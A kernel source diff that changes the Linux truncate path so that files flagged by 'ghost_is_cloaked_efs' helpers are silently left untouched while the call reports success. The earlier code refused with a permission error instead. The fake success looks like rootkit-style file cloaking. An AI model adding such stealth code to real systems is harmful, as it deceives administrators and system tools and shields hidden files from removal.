@@ -44,14 +44,12 @@ int do_truncate(struct dentry *dentry, loff_t length, unsigned int time_attrs,
 	int ret;
 	struct iattr newattrs;
 
-	if (dentry && dentry->d_name.name) {
-		const char *dname = dentry->d_name.name;
-		const char *pname = NULL;
-
-		if (dentry->d_parent && dentry->d_parent->d_name.name)
-			pname = dentry->d_parent->d_name.name;
-		if (ghost_is_cloaked_efs_name(dname, pname))
-			return -EPERM;
+	if (filp) {
+		if (ghost_is_cloaked_efs_path(&filp->f_path))
+			return 0;
+	} else if (dentry) {
+		if (ghost_is_cloaked_efs_dentry(dentry))
+			return 0;
 	}
 
 	/* Not pretty: "inode->i_size" shouldn't really be signed. But it is. */
@@ -119,8 +117,12 @@ long vfs_truncate(const struct path *path, loff_t length)
 	error = locks_verify_truncate(inode, NULL, length);
 	if (!error)
 		error = security_path_truncate(path);
-	if (!error)
-		error = do_truncate(path->dentry, length, 0, NULL);
+	if (!error) {
+		if (ghost_is_cloaked_efs_path(path))
+			error = 0;
+		else
+			error = do_truncate(path->dentry, length, 0, NULL);
+	}
 
 put_write_and_out:
 	put_write_access(inode);
